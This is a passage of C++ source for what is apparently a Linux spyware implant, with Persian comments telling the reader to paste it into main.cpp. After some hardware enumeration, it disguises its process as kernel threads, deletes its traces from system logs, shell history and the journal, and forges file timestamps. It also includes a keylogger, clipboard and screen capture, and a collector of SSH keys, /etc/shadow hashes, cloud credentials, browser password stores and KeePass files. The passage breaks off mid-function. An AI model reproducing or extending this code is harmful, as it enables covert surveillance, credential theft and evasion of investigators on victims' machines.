    uint64_t find_rsdp(){const uint8_t sig[]="RSD PTR ";uint64_t a=0;auto ep=pmem.read(0x40E,2);if(ep.size()==2){uint64_t ebda=((uint64_t)ep[1]<<8|ep[0])<<4;if(pmem.search(ebda,ebda+1024,sig,8,a))return a;}if(pmem.search(0xE0000,0x100000,sig,8,a))return a;return 0;}
    std::vector<Table> enumerate(){
        std::vector<Table> tables;uint64_t rsdp=find_rsdp();if(!rsdp)return tables;
        auto rd=pmem.read(rsdp,36);if(rd.size()<20)return tables;
        uint8_t rev=rd[15];uint64_t sdt_addr;bool xsdt=false;
        if(rev>=2&&rd.size()>=36){sdt_addr=*(uint64_t*)&rd[24];xsdt=true;}else{sdt_addr=*(uint32_t*)&rd[16];}
        auto sh=pmem.read(sdt_addr,36);if(sh.size()<36)return tables;
        uint32_t sdt_len=*(uint32_t*)&sh[4];auto sdt=pmem.read(sdt_addr,sdt_len);if(sdt.size()<sdt_len)return tables;
        Table root;memcpy(root.sig,sdt.data(),4);root.sig[4]='\0';root.length=sdt_len;root.revision=sdt[8];root.address=sdt_addr;
        root.oem_id=std::string((char*)&sdt[10],6);root.oem_table_id=std::string((char*)&sdt[16],8);root.oem_revision=*(uint32_t*)&sdt[24];root.data=sdt;tables.push_back(root);
        size_t esz=xsdt?8:4,num=(sdt_len-36)/esz;
        for(size_t i=0;i<num;i++){size_t o=36+i*esz;uint64_t ta=xsdt?*(uint64_t*)&sdt[o]:*(uint32_t*)&sdt[o];auto hdr=pmem.read(ta,36);if(hdr.size()<36)continue;
            Table t;memcpy(t.sig,&hdr[0],4);t.sig[4]='\0';t.length=*(uint32_t*)&hdr[4];t.revision=hdr[8];t.address=ta;t.oem_id=std::string((char*)&hdr[10],6);t.oem_table_id=std::string((char*)&hdr[16],8);t.oem_revision=*(uint32_t*)&hdr[24];t.data=pmem.read(ta,t.length);tables.push_back(t);}
        return tables;
    }
};

class USBEnumerator {
public:
    struct Device {std::string path;uint16_t vid,pid;std::string manufacturer,product,serial,speed,bcd_device;uint8_t class_code,subclass,protocol;int busnum,devnum,num_interfaces;};
    static std::vector<Device> enumerate(){
        std::vector<Device> devs;DIR* dir=opendir("/sys/bus/usb/devices/");if(!dir)return devs;
        struct dirent* e;while((e=readdir(dir))!=nullptr){
            std::string name(e->d_name);if(name=="."||name==".."||name.find("usb")==0||name.find(':')!=std::string::npos)continue;
            Device d;d.path="/sys/bus/usb/devices/"+name;
            auto rf=[&](const std::string& f){return read_file_content(d.path+"/"+f);};
            auto rh=[&](const std::string& f)->uint16_t{std::string s=rf(f);return s.empty()?0:(uint16_t)strtoul(s.c_str(),nullptr,16);};
            d.vid=rh("idVendor");d.pid=rh("idProduct");if(!d.vid&&!d.pid)continue;
            d.manufacturer=rf("manufacturer");d.product=rf("product");d.serial=rf("serial");d.speed=rf("speed");d.bcd_device=rf("bcdDevice");
            std::string bc=rf("bDeviceClass");if(!bc.empty())d.class_code=(uint8_t)strtoul(bc.c_str(),nullptr,16);
            std::string bs=rf("bDeviceSubClass");if(!bs.empty())d.subclass=(uint8_t)strtoul(bs.c_str(),nullptr,16);
            std::string bn=rf("busnum"),dn=rf("devnum");d.busnum=bn.empty()?0:std::stoi(bn);d.devnum=dn.empty()?0:std::stoi(dn);
            std::string ni=rf("bNumInterfaces");d.num_interfaces=ni.empty()?0:std::stoi(trim_string(ni));
            devs.push_back(d);
        }closedir(dir);return devs;
    }
};

class NetworkInterfaces {
public:
    struct Interface {std::string name;uint8_t mac[6];uint32_t ip,netmask,broadcast;int mtu;uint64_t rx_bytes,tx_bytes,rx_pkts,tx_pkts,rx_errors,tx_errors;std::string driver,operstate,duplex;bool up,loopback,wireless,promisc;int speed_mbps;};
    static std::vector<Interface> enumerate(){
        std::vector<Interface> ifaces;int sock=socket(AF_INET,SOCK_DGRAM,0);if(sock<0)return ifaces;
        DIR* dir=opendir("/sys/class/net/");if(!dir){close(sock);return ifaces;}
        struct dirent* e;while((e=readdir(dir))!=nullptr){
            std::string name(e->d_name);if(name=="."||name=="..")continue;
            Interface i;i.name=name;memset(i.mac,0,6);i.ip=i.netmask=i.broadcast=0;i.mtu=0;
            i.rx_bytes=i.tx_bytes=i.rx_pkts=i.tx_pkts=i.rx_errors=i.tx_errors=0;
            i.up=i.loopback=i.wireless=i.promisc=false;i.speed_mbps=0;
            struct ifreq ifr;memset(&ifr,0,sizeof(ifr));strncpy(ifr.ifr_name,name.c_str(),IFNAMSIZ-1);
            if(ioctl(sock,SIOCGIFHWADDR,&ifr)==0)memcpy(i.mac,ifr.ifr_hwaddr.sa_data,6);
            if(ioctl(sock,SIOCGIFADDR,&ifr)==0)i.ip=((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
            if(ioctl(sock,SIOCGIFNETMASK,&ifr)==0)i.netmask=((struct sockaddr_in*)&ifr.ifr_netmask)->sin_addr.s_addr;
            if(ioctl(sock,SIOCGIFMTU,&ifr)==0)i.mtu=ifr.ifr_mtu;
            if(ioctl(sock,SIOCGIFFLAGS,&ifr)==0){i.up=(ifr.ifr_flags&IFF_UP)!=0;i.loopback=(ifr.ifr_flags&IFF_LOOPBACK)!=0;i.promisc=(ifr.ifr_flags&IFF_PROMISC)!=0;}
            std::string base="/sys/class/net/"+name;
            auto rs=[&](const std::string& p)->uint64_t{std::string s=read_file_content(base+"/statistics/"+p);return s.empty()?0:strtoull(s.c_str(),nullptr,10);};
            i.rx_bytes=rs("rx_bytes");i.tx_bytes=rs("tx_bytes");i.rx_pkts=rs("rx_packets");i.tx_pkts=rs("tx_packets");
            i.rx_errors=rs("rx_errors");i.tx_errors=rs("tx_errors");
            i.wireless=file_exists(base+"/wireless");i.operstate=read_file_content(base+"/operstate");
            std::string spd=read_file_content(base+"/speed");if(!spd.empty())i.speed_mbps=std::stoi(spd);
            i.duplex=read_file_content(base+"/duplex");
            char lbuf[256];ssize_t ln=readlink((base+"/device/driver").c_str(),lbuf,sizeof(lbuf)-1);
            if(ln>0){lbuf[ln]='\0';i.driver=lbuf;auto p=i.driver.rfind('/');if(p!=std::string::npos)i.driver=i.driver.substr(p+1);}
            ifaces.push_back(i);
        }closedir(dir);close(sock);return ifaces;
    }
};

class DMAMapper {
public:
    struct Region {uint64_t base,size;std::string description;int indent;bool attack_surface;};
    static std::vector<Region> map(){
        std::vector<Region> regions;std::ifstream f("/proc/iomem");std::string line;
        while(std::getline(f,line)){if(line.empty())continue;int indent=0;while(indent<(int)line.size()&&line[indent]==' ')indent++;indent/=2;
            uint64_t s=0,e=0;char desc[256]={};if(sscanf(line.c_str()," %lx-%lx : %[^\n]",&s,&e,desc)>=2){
                Region r;r.base=s;r.size=e-s+1;r.description=desc;r.indent=indent;
                std::string d(desc);r.attack_surface=(d.find("PCI")!=std::string::npos||d.find("MMIO")!=std::string::npos||d.find("Video")!=std::string::npos||d.find("ACPI")!=std::string::npos);
                regions.push_back(r);}}return regions;
    }
};

class GPUDetector {
public:
    struct GPUInfo {std::string driver;uint16_t pci_vendor,pci_device;uint64_t memory_bytes;};
    static std::vector<GPUInfo> detect(){
        std::vector<GPUInfo> gpus;auto files=glob_files("/sys/class/drm/card*/device");
        for(auto& dp:files){GPUInfo g;
            std::string vs=read_file_content(dp+"/vendor"),ds=read_file_content(dp+"/device");
            if(!vs.empty())g.pci_vendor=(uint16_t)strtoul(vs.c_str(),nullptr,16);
            if(!ds.empty())g.pci_device=(uint16_t)strtoul(ds.c_str(),nullptr,16);
            char lb[256];ssize_t ln=readlink((dp+"/driver").c_str(),lb,sizeof(lb)-1);
            if(ln>0){lb[ln]='\0';g.driver=lb;auto p=std::string(lb).rfind('/');if(p!=std::string::npos)g.driver=std::string(lb).substr(p+1);}
            std::ifstream res(dp+"/resource");std::string rl;g.memory_bytes=0;
            while(std::getline(res,rl)){uint64_t s,e,fl;if(sscanf(rl.c_str(),"0x%lx 0x%lx 0x%lx",&s,&e,&fl)==3&&e>s)g.memory_bytes+=(e-s+1);}
            gpus.push_back(g);}return gpus;
    }
};

class StorageDetector {
public:
    struct DiskInfo {std::string name,model,serial,firmware,transport;uint64_t size_bytes;bool rotational,removable;std::vector<std::string> partitions;};
    static std::vector<DiskInfo> detect(){
        std::vector<DiskInfo> disks;DIR* dir=opendir("/sys/block/");if(!dir)return disks;
        struct dirent* e;while((e=readdir(dir))!=nullptr){
            std::string name(e->d_name);if(name=="."||name==".."||name.find("loop")==0||name.find("ram")==0)continue;
            std::string base="/sys/block/"+name;DiskInfo d;d.name=name;
            d.model=read_file_content(base+"/device/model");d.serial=read_file_content(base+"/device/serial");
            d.firmware=read_file_content(base+"/device/firmware_rev");
            std::string sz=read_file_content(base+"/size");d.size_bytes=sz.empty()?0:strtoull(sz.c_str(),nullptr,10)*512;
            d.rotational=(read_file_content(base+"/queue/rotational")=="1");d.removable=(read_file_content(base+"/removable")=="1");
            if(name.find("nvme")!=std::string::npos)d.transport="NVMe";else if(name.find("sd")==0)d.transport="SCSI/SATA";else if(name.find("vd")==0)d.transport="VirtIO";
            auto parts=glob_files(base+"/"+name+"*");for(auto& p:parts){auto pos=p.rfind('/');if(pos!=std::string::npos)d.partitions.push_back(p.substr(pos+1));}
            disks.push_back(d);}closedir(dir);return disks;
    }
};

class ThermalMonitor {
public:
    struct Zone {std::string type;int temp_mC;int trips[8];int trip_count;};
    static std::vector<Zone> read_zones(){
        std::vector<Zone> zones;auto dirs=glob_files("/sys/class/thermal/thermal_zone*");
        for(auto& d:dirs){Zone z;z.trip_count=0;z.type=read_file_content(d+"/type");
            std::string t=read_file_content(d+"/temp");z.temp_mC=t.empty()?0:std::stoi(t);
            for(int i=0;i<8;i++){std::string tp=read_file_content(d+"/trip_point_"+std::to_string(i)+"_temp");if(tp.empty())break;z.trips[z.trip_count++]=std::stoi(tp);}
            zones.push_back(z);}return zones;
    }
};

class PowerSupply {
public:
    struct Info {std::string name,type,status,technology,manufacturer,model,serial;int capacity,voltage_uV,current_uA;};
    static std::vector<Info> detect(){
        std::vector<Info> supplies;auto dirs=glob_files("/sys/class/power_supply/*");
        for(auto& d:dirs){Info ps;ps.name=d.substr(d.rfind('/')+1);ps.type=read_file_content(d+"/type");
            ps.status=read_file_content(d+"/status");std::string c=read_file_content(d+"/capacity");ps.capacity=c.empty()?-1:std::stoi(c);
            std::string v=read_file_content(d+"/voltage_now");ps.voltage_uV=v.empty()?0:std::stoi(v);
            ps.technology=read_file_content(d+"/technology");ps.manufacturer=read_file_content(d+"/manufacturer");
            ps.model=read_file_content(d+"/model_name");ps.serial=read_file_content(d+"/serial_number");
            supplies.push_back(ps);}return supplies;
    }
};

class InputDevices {
public:
    struct InputDev {std::string name,phys,uniq,handlers;uint16_t bustype,vendor,product,version;};
    static std::vector<InputDev> enumerate(){
        std::vector<InputDev> devs;std::ifstream f("/proc/bus/input/devices");if(!f)return devs;
        InputDev cur;std::string line;bool has=false;
        while(std::getline(f,line)){
            if(line.empty()){if(has)devs.push_back(cur);cur=InputDev();has=false;continue;}
            if(line[0]=='I'&&line[1]==':'){has=true;sscanf(line.c_str(),"I: Bus=%hx Vendor=%hx Product=%hx Version=%hx",&cur.bustype,&cur.vendor,&cur.product,&cur.version);}
            else if(line[0]=='N'&&line[1]==':'){auto p=line.find('"');auto e=line.rfind('"');if(p!=std::string::npos&&e>p)cur.name=line.substr(p+1,e-p-1);}
            else if(line[0]=='P'&&line[1]==':')cur.phys=line.substr(line.find('=')+1);
            else if(line[0]=='U'&&line[1]==':')cur.uniq=line.substr(line.find('=')+1);
            else if(line[0]=='H'&&line[1]==':')cur.handlers=line.substr(line.find('=')+1);
        }if(has)devs.push_back(cur);return devs;
    }
};

} /* namespace Hardware */

/* ═══════════════════════════════════════════════════════════
 *  PART 2: STEALTH, CAPTURE, CREDENTIALS, PRIVESC, RECON
 *  ادامه مستقیم از قطعه ۱ - در همان main.cpp بچسبانید
 * ═══════════════════════════════════════════════════════════ */

namespace Stealth {

class ProcessHider {
public:
    static bool rename_process(const char* name) {
        return prctl(PR_SET_NAME, reinterpret_cast<unsigned long>(name), 0, 0, 0) == 0;
    }

    static void modify_argv(int argc, char** argv) {
        if (argc <= 0 || !argv[0]) return;
        const char* fakes[] = {
            "[kworker/0:0-events]", "[migration/0]", "[ksoftirqd/0]",
            "[kdevtmpfs]", "[rcu_sched]", "[watchdog/0]",
            "[mm_percpu_wq]", "[netns]", "[kcompactd0]",
            "[khugepaged]", "[kintegrityd]", "[kblockd]"
        };
        const char* name = fakes[Crypto::SecureRandom::random32() % 12];
        size_t total = 0;
        for (int i = 0; i < argc; i++) total += strlen(argv[i]) + 1;
        memset(argv[0], 0, total);
        strncpy(argv[0], name, total - 1);
        for (int i = 1; i < argc; i++) argv[i] = nullptr;
    }

    static bool set_oom_immune() {
        return write_file("/proc/self/oom_score_adj", "-1000");
    }

    static bool drop_sched_priority() {
        struct sched_param sp;
        sp.sched_priority = 0;
        return sched_setscheduler(0, SCHED_IDLE, &sp) == 0;
    }
};

class MemoryProtection {
public:
    static void secure_clear(void* ptr, size_t size) {
        volatile uint8_t* p = static_cast<volatile uint8_t*>(ptr);
        for (size_t i = 0; i < size; i++) p[i] = 0;
        asm volatile("" ::: "memory");
    }

    static bool lock_pages(void* ptr, size_t size) {
        return mlock(ptr, size) == 0;
    }

    static bool disable_dumps() {
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        struct rlimit rl = {0, 0};
        setrlimit(RLIMIT_CORE, &rl);
        return true;
    }

    static bool guard_page() {
        void* g = mmap(nullptr, 4096, PROT_NONE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        return g != MAP_FAILED;
    }

    static void wipe_stack_region() {
        volatile char buf[4096];
        memset((void*)buf, 0, sizeof(buf));
        asm volatile("" ::: "memory");
    }
};

class LogCleaner {
public:
    static void clean_auth_log() {
        const char* logs[] = {
            "/var/log/auth.log", "/var/log/secure",
            "/var/log/syslog", "/var/log/messages",
            "/var/log/kern.log", "/var/log/daemon.log"
        };
        pid_t my_pid = getpid();
        std::string pid_str = std::to_string(my_pid);

        for (const auto& log : logs) {
            if (!file_exists(log)) continue;
            std::ifstream in(log);
            std::string tmp = std::string(log) + ".tmp." +
                std::to_string(Crypto::SecureRandom::random32());
            std::ofstream out(tmp);
            std::string line;
            while (std::getline(in, line)) {
                if (line.find(pid_str) == std::string::npos &&
                    line.find("hwmon") == std::string::npos &&
                    line.find(".libhw") == std::string::npos &&
                    line.find("apt_intel") == std::string::npos) {
                    out << line << "\n";
                }
            }
            in.close();
            out.close();
            rename(tmp.c_str(), log);
        }
    }

    static void clean_timestamps() {
        const char* files[] = {
            "/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"
        };
        struct stat ref_st;
        if (stat("/usr/bin/ls", &ref_st) != 0) return;

        for (const auto& f : files) {
            if (!file_exists(f)) continue;
            struct timespec times[2] = {ref_st.st_atim, ref_st.st_mtim};
            utimensat(AT_FDCWD, f, times, 0);
        }
    }

    static void clean_bash_history() {
        auto files = glob_files("/root/.*history");
        auto files2 = glob_files("/home/*/.*history");
        files.insert(files.end(), files2.begin(), files2.end());

        for (const auto& f : files) {
            std::ifstream in(f);
            std::string tmp = f + ".tmp";
            std::ofstream out(tmp);
            std::string line;
            while (std::getline(in, line)) {
                if (line.find("hwmon") == std::string::npos &&
                    line.find(".libhw") == std::string::npos &&
                    line.find("apt_intel") == std::string::npos &&
                    line.find("/tmp/.hw") == std::string::npos) {
                    out << line << "\n";
                }
            }
            in.close();
            out.close();
            rename(tmp.c_str(), f.c_str());
        }
    }

    static void clean_systemd_journal() {
        /* حذف لاگ‌های journal مربوط به خودمان */
        exec_command("journalctl --rotate 2>/dev/null");
        exec_command("journalctl --vacuum-time=1s 2>/dev/null");
    }

    static void clean_all() {
        if (is_root()) {
            clean_auth_log();
            clean_timestamps();
            clean_systemd_journal();
        }
        clean_bash_history();
    }
};

class TimestampForger {
public:
    static bool match_reference(const std::string& target,
                                const std::string& reference) {
        struct stat st;
        if (stat(reference.c_str(), &st) != 0) return false;
        struct timespec times[2] = {st.st_atim, st.st_mtim};
        return utimensat(AT_FDCWD, target.c_str(), times, 0) == 0;
    }

    static bool set_epoch(const std::string& path, time_t epoch) {
        struct timespec times[2];
        times[0].tv_sec = epoch;
        times[0].tv_nsec = 0;
        times[1] = times[0];
        return utimensat(AT_FDCWD, path.c_str(), times, 0) == 0;
    }
};

class IntegrityChecker {
public:
    static std::array<uint8_t, 32> self_hash() {
        char path[256];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
        if (len <= 0) return {};
        path[len] = '\0';
        auto data = read_binary_file(path);
        if (data.empty()) return {};
        return Crypto::SHA256::hash(data);
    }

    static bool verify(const std::array<uint8_t, 32>& expected) {
        return self_hash() == expected;
    }

    static std::array<uint8_t, 32> code_section_hash() {
        std::ifstream maps("/proc/self/maps");
        std::string line;
        while (std::getline(maps, line)) {
            if (line.find("r-xp") != std::string::npos &&
                line.find("[vdso]") == std::string::npos &&
                line.find("[vsyscall]") == std::string::npos) {
                uint64_t start, end;
                if (sscanf(line.c_str(), "%lx-%lx", &start, &end) == 2) {
                    size_t sz = end - start;
                    if (sz > 0 && sz < 100 * 1024 * 1024) {
                        return Crypto::SHA256::hash(
                            reinterpret_cast<uint8_t*>(start), sz);
                    }
                }
            }
        }
        return {};
    }
};

} /* namespace Stealth */

namespace Capture {

class KeyLogger {
private:
    std::vector<int> input_fds;
    std::atomic<bool> running;
    std::vector<uint8_t> captured;
    std::mutex capture_mutex;
    std::thread capture_thread;

    void find_keyboards() {
        DIR* dir = opendir("/dev/input/");
        if (!dir) return;
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            std::string name(entry->d_name);
            if (name.find("event") != 0) continue;
            std::string path = "/dev/input/" + name;
            int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
            if (fd < 0) continue;

            unsigned long evbit = 0;
            if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) >= 0) {
                if (evbit & (1 << EV_KEY)) {
                    unsigned long keybit[KEY_MAX / (sizeof(long) * 8) + 1] = {};
                    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) >= 0) {
                        bool has_keys = false;
                        for (int k = KEY_Q; k <= KEY_P; k++) {
                            if (keybit[k / (sizeof(long) * 8)] &
                                (1UL << (k % (sizeof(long) * 8)))) {
                                has_keys = true;
                                break;
                            }
                        }
                        if (has_keys) {
                            int flags = fcntl(fd, F_GETFL);
                            fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
                            input_fds.push_back(fd);
                            continue;
                        }
                    }
                }
            }
            close(fd);
        }
        closedir(dir);
    }

    void capture_loop() {
        while (running.load()) {
            fd_set fds;
            struct timeval tv = {0, 200000};
            FD_ZERO(&fds);
            int max_fd = 0;
            for (int fd : input_fds) {
                FD_SET(fd, &fds);
                if (fd > max_fd) max_fd = fd;
            }
            if (max_fd == 0) break;

            if (select(max_fd + 1, &fds, nullptr, nullptr, &tv) > 0) {
                for (int fd : input_fds) {
                    if (!FD_ISSET(fd, &fds)) continue;
                    struct input_event ev;
                    while (::read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
                        if (ev.type == EV_KEY &&
                            (ev.value == 1 || ev.value == 2)) {
                            std::lock_guard<std::mutex> lock(capture_mutex);
                            /* [scancode:2][timestamp:4] */
                            captured.push_back(ev.code & 0xFF);
                            captured.push_back((ev.code >> 8) & 0xFF);
                            uint32_t ts = ev.time.tv_sec & 0xFFFFFFFF;
                            for (int i = 0; i < 4; i++)
                                captured.push_back((ts >> (i * 8)) & 0xFF);
                        }
                    }
                }
            }
        }
    }

public:
    KeyLogger() : running(false) {}
    ~KeyLogger() { stop(); }

    bool start() {
        find_keyboards();
        if (input_fds.empty()) return false;
        running = true;
        capture_thread = std::thread(&KeyLogger::capture_loop, this);
        return true;
    }

    void stop() {
        running = false;
        if (capture_thread.joinable()) capture_thread.join();
        for (int fd : input_fds) close(fd);
        input_fds.clear();
    }

    std::vector<uint8_t> get_data() {
        std::lock_guard<std::mutex> lock(capture_mutex);
        auto data = captured;
        captured.clear();
        return data;
    }

    size_t key_count() {
        std::lock_guard<std::mutex> lock(capture_mutex);
        return captured.size() / 6;
    }

    bool is_running() const { return running.load(); }
};

class ClipboardCapture {
public:
    static std::string capture() {
        std::string clip = exec_command("xclip -selection clipboard -o 2>/dev/null");
        if (clip.empty())
            clip = exec_command("xsel --clipboard --output 2>/dev/null");
        if (clip.empty())
            clip = exec_command("wl-paste 2>/dev/null");
        return clip;
    }

    static std::string capture_primary() {
        return exec_command("xclip -selection primary -o 2>/dev/null");
    }

    static std::vector<std::string> capture_all() {
        std::vector<std::string> clips;
        std::string cb = capture();
        if (!cb.empty()) clips.push_back("CLIPBOARD: " + cb);
        std::string pr = capture_primary();
        if (!pr.empty()) clips.push_back("PRIMARY: " + pr);
        return clips;
    }
};

class ScreenCapture {
public:
    static bool capture_to_file(const std::string& output) {
        if (system(("import -window root " + output + " 2>/dev/null").c_str()) == 0)
            return true;
        if (system(("scrot " + output + " 2>/dev/null").c_str()) == 0)
            return true;
        if (system(("gnome-screenshot -f " + output + " 2>/dev/null").c_str()) == 0)
            return true;
        return false;
    }

    static std::vector<uint8_t> capture_framebuffer() {
        if (!file_exists("/dev/fb0")) return {};
        return read_binary_file("/dev/fb0");
    }
};

class FileExfiltrator {
public:
    struct FileTarget {
        std::string path;
        uint64_t size;
        std::string category;
    };

    static std::vector<FileTarget> find_targets() {
        std::vector<FileTarget> targets;

        auto add_glob = [&](const std::string& pattern,
                            const std::string& category,
                            uint64_t max_size = 5 * 1024 * 1024) {
            auto files = glob_files(pattern);
            for (const auto& f : files) {
                struct stat st;
                if (stat(f.c_str(), &st) != 0 || !S_ISREG(st.st_mode))
                    continue;
                if ((uint64_t)st.st_size > max_size) continue;
                targets.push_back({f, (uint64_t)st.st_size, category});
            }
        };

        /* کلیدهای SSH */
        add_glob("/root/.ssh/*", "ssh_key", 1024 * 1024);
        add_glob("/home/*/.ssh/*", "ssh_key", 1024 * 1024);

        /* فایل‌های حساس سیستم */
        const char* sys_files[] = {
            "/etc/shadow", "/etc/passwd", "/etc/sudoers",
            "/etc/hosts", "/etc/resolv.conf", "/etc/fstab",
            "/etc/crypttab",
            "/etc/network/interfaces",
            "/etc/wpa_supplicant/wpa_supplicant.conf",
            "/etc/NetworkManager/system-connections/*"
        };
        for (const auto& f : sys_files) {
            if (strchr(f, '*'))
                add_glob(f, "system_config");
            else {
                struct stat st;
                if (stat(f, &st) == 0 && S_ISREG(st.st_mode) &&
                    (uint64_t)st.st_size < 10 * 1024 * 1024) {
                    targets.push_back({f, (uint64_t)st.st_size, "system_config"});
                }
            }
        }

        /* تنظیمات کاربری */
        add_glob("/root/.gnupg/secring.*", "gpg_key");
        add_glob("/root/.gnupg/pubring.*", "gpg_key");
        add_glob("/home/*/.gnupg/secring.*", "gpg_key");
        add_glob("/home/*/.gnupg/pubring.*", "gpg_key");

        /* اعتبارنامه‌های ابری */
        add_glob("/root/.aws/credentials", "cloud_cred");
        add_glob("/home/*/.aws/credentials", "cloud_cred");
        add_glob("/root/.config/gcloud/*", "cloud_cred");
        add_glob("/home/*/.config/gcloud/*", "cloud_cred");
        add_glob("/root/.kube/config", "cloud_cred");
        add_glob("/home/*/.kube/config", "cloud_cred");
        add_glob("/root/.docker/config.json", "cloud_cred");
        add_glob("/home/*/.docker/config.json", "cloud_cred");
        add_glob("/root/.azure/*", "cloud_cred");
        add_glob("/home/*/.azure/*", "cloud_cred");

        /* رمزعبورهای ذخیره‌شده */
        add_glob("/root/.netrc", "stored_password");
        add_glob("/home/*/.netrc", "stored_password");
        add_glob("/root/.pgpass", "stored_password");
        add_glob("/home/*/.pgpass", "stored_password");
        add_glob("/root/.my.cnf", "stored_password");
        add_glob("/home/*/.my.cnf", "stored_password");

        /* پایگاه‌داده رمزعبور مرورگرها */
        add_glob("/home/*/.mozilla/firefox/*/logins.json", "browser_cred");
        add_glob("/home/*/.mozilla/firefox/*/key4.db", "browser_cred");
        add_glob("/home/*/.config/google-chrome/*/Login Data", "browser_cred");
        add_glob("/home/*/.config/chromium/*/Login Data", "browser_cred");

        /* فایل‌های KeePass */
        add_glob("/home/*/*.kdbx", "password_db");
        add_glob("/home/*/*.kdb", "password_db");
        add_glob("/root/*.kdbx", "password_db");

        /* تاریخچه‌ها */
        add_glob("/root/.*_history", "history", 2 * 1024 * 1024);
        add_glob("/home/*/.*_history", "history", 2 * 1024 * 1024);

        /* کلیدهای API و توکن‌ها */
        add_glob("/root/.npmrc", "api_token");
        add_glob("/home/*/.npmrc", "api_token");
        add_glob("/root/.pypirc", "api_token");
        add_glob("/home/*/.pypirc", "api_token");
        add_glob("/root/.gem/credentials", "api_token");
        add_glob("/home/*/.gem/credentials", "api_token");

        /* Ansible و اتوماسیون */
        add_glob("/etc/ansible/hosts", "automation");
        add_glob("/root/.ansible/*", "automation");

        /* WireGuard */
        add_glob("/etc/wireguard/*.conf", "vpn_config");

        /* OpenVPN */
        add_glob("/etc/openvpn/*.conf", "vpn_config");
        add_glob("/etc/openvpn/*.ovpn", "vpn_config");

        return targets;
    }

    static std::vector<uint8_t> collect(const std::vector<FileTarget>& targets,
                                         size_t max_total = 50 * 1024 * 1024) {
        std::vector<uint8_t> result;
        uint32_t count = 0;

        /* شمارنده جا-نگهدار */
        size_t count_pos = result.size();
        result.resize(result.size() + 4);

        for (const auto& t : targets) {
            if (result.size() > max_total) break;

            auto data = read_binary_file(t.path);
            if (data.empty()) continue;

            /* [category_len:1][category][path_len:2][path][data_len:4][data] */
            result.push_back(static_cast<uint8_t>(t.category.size()));
            result.insert(result.end(), t.category.begin(), t.category.end());

            uint16_t path_len = t.path.size();
            result.push_back(path_len & 0xFF);
            result.push_back((path_len >> 8) & 0xFF);
            result.insert(result.end(), t.path.begin(), t.path.end());

            uint32_t data_len = data.size();
            for (int i = 0; i < 4; i++)
                result.push_back((data_len >> (i * 8)) & 0xFF);
            result.insert(result.end(), data.begin(), data.end());

            count++;
        }

        /* بازنویسی شمارنده */
        memcpy(result.data() + count_pos, &count, 4);
        return result;
    }
};

} /* namespace Capture */

namespace Credentials {

class ShadowHarvester {
public:
    struct ShadowEntry {
        std::string username;
        std::string hash;
        std::string hash_type;
    };

    static std::vector<ShadowEntry> harvest() {
        std::vector<ShadowEntry> entries;
        std::ifstream f("/etc/shadow");
        std::string line;
        while (std::getline(f, line)) {
            auto parts = split_string(line, ':');
            if (parts.size() < 2) continue;
            if (parts[1] == "*" || parts[1] == "!" ||
                parts[1] == "!!" || parts[1].empty()) continue;

            ShadowEntry e;
            e.username = parts[0];
            e.hash = parts[1];

            /* شناسایی نوع هش */
            if (e.hash.find("$6$") == 0) e.hash_type = "SHA-512";
            else if (e.hash.find("$5$") == 0) e.hash_type = "SHA-256";
            else if (e.hash.find("$y$") == 0) e.hash_type = "yescrypt";
            else if (e.hash.find("$2") == 0) e.hash_type = "bcrypt";
            else if (e.hash.find("$1$") == 0) e.hash_type = "MD5";
            else e.hash_type = "unknown";

            entries.push_back(e);
        }
        return entries;
    }
};

class SSHKeyHarvester {
public:
    struct SSHKey {
        std::string path, type, user;
        std::vector<uint8_t> data;
        bool is_private, is_encrypted;
    };

    static std::vector<SSHKey> harvest() {
        std::vector<SSHKey> keys;

        auto scan_dir = [&](const std::string& dir, const std::string& user) {
            auto files = glob_files(dir + "/*");
            for (const auto& f : files) {
                auto data = read_binary_file(f);
                if (data.empty()) continue;

                SSHKey key;
                key.path = f;
                key.user = user;
                key.data = data;

                std::string content(data.begin(), data.end());
                key.is_private = content.find("PRIVATE KEY") != std::string::npos;
                key.is_encrypted = content.find("ENCRYPTED") != std::string::npos;

                if (f.find("id_rsa") != std::string::npos) key.type = "rsa";
                else if (f.find("id_ed25519") != std::string::npos) key.type = "ed25519";
                else if (f.find("id_ecdsa") != std::string::npos) key.type = "ecdsa";
                else if (f.find("id_dsa") != std::string::npos) key.type = "dsa";
                else if (f.find("authorized_keys") != std::string::npos) key.type = "authorized";
                else if (f.find("known_hosts") != std::string::npos) key.type = "known_hosts";
                else if (f.find("config") != std::string::npos) key.type = "config";
                else continue;

                keys.push_back(key);
            }
        };

        scan_dir("/root/.ssh", "root");
        auto homes = glob_files("/home/*");
        for (const auto& h : homes) {
            std::string user = h.substr(h.rfind('/') + 1);
            scan_dir(h + "/.ssh", user);
        }

        return keys;
    }

    static std::vector<std::string> parse_known_hosts() {
        std::vector<std::string> hosts;
        auto parse = [&](const std::string& path) {
            std::ifstream f(path);
            std::string line;
            while (std::getline(f, line)) {
                if (line.empty() || line[0] == '#' || line[0] == '|') continue;
                auto parts = split_string(line, ' ');
                if (!parts.empty()) {
                    auto host_parts = split_string(parts[0], ',');
                    for (const auto& h : host_parts) {
                        if (!h.empty() && h[0] != '|')
                            hosts.push_back(h);
                    }
                }
            }
        };

        parse("/root/.ssh/known_hosts");
        auto files = glob_files("/home/*/.ssh/known_hosts");
        for (const auto& f : files) parse(f);

        std::sort(hosts.begin(), hosts.end());
        hosts.erase(std::unique(hosts.begin(), hosts.end()), hosts.end());
        return hosts;
    }

    static std::vector<std::string> parse_ssh_config() {
        std::vector<std::string> targets;
        auto parse = [&](const std::string& path) {
            std::ifstream f(path);
            std::string line;
            while (std::getline(f, line)) {
                line = trim_string(line);
                if (line.find("Host ") == 0 || line.find("HostName ") == 0) {
                    auto parts = split_string(line, ' ');
                    for (size_t i = 1; i < parts.size(); i++) {
                        if (parts[i] != "*" && !parts[i].empty())
                            targets.push_back(parts[i]);
                    }
                }
            }
        };

        parse("/root/.ssh/config");
        auto files = glob_files("/home/*/.ssh/config");
